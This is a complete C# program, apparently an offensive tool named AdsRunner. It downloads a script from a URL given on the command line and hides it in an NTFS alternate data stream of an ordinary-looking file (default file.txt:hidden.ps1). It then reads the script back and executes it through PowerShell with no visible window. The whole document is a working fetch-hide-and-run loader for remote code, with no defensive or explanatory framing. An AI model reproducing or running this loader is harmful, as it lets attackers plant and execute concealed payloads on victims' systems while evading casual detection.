using System;
using System.Net;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

class AdsRunner
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    const uint GENERIC_READ = 0x80000000;
    const uint GENERIC_WRITE = 0x40000000;
    const uint CREATE_ALWAYS = 2;
    const uint OPEN_EXISTING = 3;
    const uint FILE_ATTRIBUTE_NORMAL = 0x80;

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: AdsRunner.exe <url> [file] [stream] [-d]");
            Console.WriteLine("  -d  Download only (no execute)");
            return;
        }

        string url = args[0];
        string file = "file.txt";
        string stream = "hidden.ps1";
        bool downloadOnly = false;

        for (int i = 1; i < args.Length; i++)
        {
            if (args[i] == "-d")
                downloadOnly = true;
            else if (i == 1)
                file = args[i];
            else if (i == 2)
                stream = args[i];
        }

        string adsPath = file + ":" + stream;

        // Create base file if not exists
        if (!File.Exists(file))
            File.WriteAllText(file, "");

        // Download content
        string content;
        using (WebClient client = new WebClient())
        {
            content = client.DownloadString(url);
        }

        // Write to ADS using CreateFile API
        using (var handle = CreateFile(adsPath, GENERIC_WRITE, 0, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero))
        {
            if (handle.IsInvalid)
            {
                Console.WriteLine("Failed to create ADS");
                return;
            }
            using (var fs = new FileStream(handle, FileAccess.Write))
            using (var sw = new StreamWriter(fs, Encoding.UTF8))
            {
                sw.Write(content);
            }
        }

        if (downloadOnly)
            return;

        // Read from ADS
        string script;
        using (var handle = CreateFile(adsPath, GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero))
        {
            if (handle.IsInvalid)
            {
                Console.WriteLine("Failed to read ADS");
                return;
            }
            using (var fs = new FileStream(handle, FileAccess.Read))
            using (var sr = new StreamReader(fs, Encoding.UTF8))
            {
                script = sr.ReadToEnd();
            }
        }

        // Execute
        Process.Start(new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = "-Command \"" + script.Replace("\"", "\\\"") + "\"",
            UseShellExecute = false,
            CreateNoWindow = true
        });
    }
}
